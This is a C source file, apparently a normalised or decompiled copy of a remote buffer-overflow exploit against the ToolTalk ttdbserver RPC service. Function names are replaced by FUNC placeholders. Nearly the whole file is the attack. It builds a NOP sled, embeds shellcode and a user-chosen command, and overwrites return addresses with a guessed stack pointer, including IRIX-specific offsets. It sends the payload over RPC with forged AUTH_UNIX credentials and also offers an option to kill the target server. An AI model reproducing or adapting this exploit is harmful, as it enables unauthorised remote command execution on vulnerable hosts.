#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_9__   TYPE_2__ ;
typedef  struct TYPE_8__   TYPE_1__ ;

/* Type definitions */
typedef  int u_long ;
struct tt_reply {int i1; int i2; } ;
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_8__ {int s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; TYPE_1__ sin_addr; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef  enum clnt_stat { ____Placeholder_clnt_stat } clnt_stat ;
typedef  int /*<<< orphan*/  buf ;
struct TYPE_9__ {int /*<<< orphan*/  cl_auth; } ;
typedef  TYPE_2__ CLIENT ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int BSIZE ; 
 int EOF ; 
 int LENOFS ; 
 char* NOP ; 
 int PORT ; 
 int RPC_ANYSOCK ; 
 int RPC_SUCCESS ; 
 int SP ; 
 int /*<<< orphan*/  TT_DBSERVER_PROG ; 
 int /*<<< orphan*/  TT_DBSERVER_VERS ; 
 int _TT_P ; 
 char* asmcode ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int FUNC2 (TYPE_2__*,int,int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ,char*,struct timeval) ; 
 int /*<<< orphan*/  FUNC3 (TYPE_2__*) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (TYPE_2__*,char*) ; 
 TYPE_2__* FUNC6 (struct sockaddr_in*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 TYPE_2__* FUNC7 (struct sockaddr_in*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,struct timeval,int*) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 struct hostent* FUNC9 (char*) ; 
 int FUNC10 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC14 (char*,...) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*) ; 
 size_t FUNC17 (char*) ; 
 int /*<<< orphan*/  FUNC18 (char*) ; 
 int /*<<< orphan*/  xdr_tt_reply ; 
 int /*<<< orphan*/  xdr_wrapstring ; 

FUNC19(int argc, char *argv[]) {
  extern int optind;
  extern char *optarg;
  CLIENT *cl;
  enum clnt_stat stat;
  struct timeval tm;
  struct hostent *hp;
  struct sockaddr_in target;
  struct tt_reply op_res;
  char buf[64000], *path, *cmd, *host, *bp, *outfile = NULL;
  int sd, i, sp = SP, bsize = BSIZE, port = PORT, kill = 0, proto = 0;

  while ((i = FUNC10(argc, argv, "ukp:f:")) != EOF)
    switch (i) {
      case 'p':
        port = FUNC0(optarg);
        break;
      case 'k':
        kill = 1;
        break;
      case 'u':
        proto = 1;
        break;
      case 'f':
        outfile = optarg;
        break;
      default:
        FUNC18(argv[0]);
    }
  if (argc - optind < 2)
    FUNC18(argv[0]);
  cmd = argv[optind + 1];
  host = argv[optind];

  for (i = 0; i < sizeof(buf); i++)
    *(buf + i) = NOP[i % 4];

  i = bsize - FUNC17(asmcode) - FUNC17(cmd);
  i &= 0xfffffffc;
  FUNC16(buf + i, asmcode);
  FUNC15(buf, cmd);
  *(int *)(buf + i + LENOFS) = ~(FUNC17(cmd) + 1);
  buf[FUNC17(buf)] = '.';
  bp = buf + bsize;
  for (i = 0; i < 16; bp+=4, i++)
    *(int *)bp = sp;
#ifdef IRIX
  sp = sp + 400 + 31652;
  for (i = 0; i < 5000; bp+=4, i++)
    *(int *)bp = sp;
  *bp++ = '/';
  *bp++ = 'f';
  path = buf + 2;
#else
  path = buf;
#endif
  *bp = 0;

  if (outfile) {
    FUNC13(outfile, buf, proto);
    FUNC14("rpc datagram stored in %s\n", outfile);
    FUNC8(0);
  }

  if ((target.sin_addr.s_addr = FUNC12(host)) == -1) {
    if ((hp = FUNC9(host)) == NULL) {
      FUNC14("%s: cannot resolve\n", host);
      FUNC8(1); 
    } else
      target.sin_addr.s_addr = *(u_long *)hp->h_addr;
  }
  target.sin_family = AF_INET;
  target.sin_port = FUNC11(port);
  sd = RPC_ANYSOCK;

  tm.tv_sec = 4;
  tm.tv_usec = 0;
  if (proto) 
    cl = FUNC7(&target, TT_DBSERVER_PROG, TT_DBSERVER_VERS, tm, &sd);
  else
    cl = FUNC6(&target, TT_DBSERVER_PROG, TT_DBSERVER_VERS, &sd, 0, 0);
  if (cl == NULL) {
    FUNC4("clnt_create");
    FUNC8(0);
  }
  cl->cl_auth = FUNC1("localhost", 0, 0, 0, NULL);
  tm.tv_sec = 10;

  if (kill) {
    path = NULL;
    bp = NULL;
    if ((stat = FUNC2(cl, 15, xdr_wrapstring, (char *)&path, 
        xdr_wrapstring, (char *)&bp, tm)) != RPC_SUCCESS) {
      FUNC5(cl, "clnt_call");
      FUNC8(1);
    }
    FUNC14("Could not kill ttdbserver, reply is: %s\n", bp);
    FUNC8(1);
  }

  if ((stat = FUNC2(cl, _TT_P, xdr_wrapstring, (char *)&path, xdr_tt_reply, 
       (char *)&op_res, tm)) != RPC_SUCCESS) {
    FUNC5(cl, "clnt_call");
    FUNC8(1);
  }
  FUNC14("res i1 %d, res i2 %d\n", op_res.i1, op_res.i2);
  FUNC3(cl);
}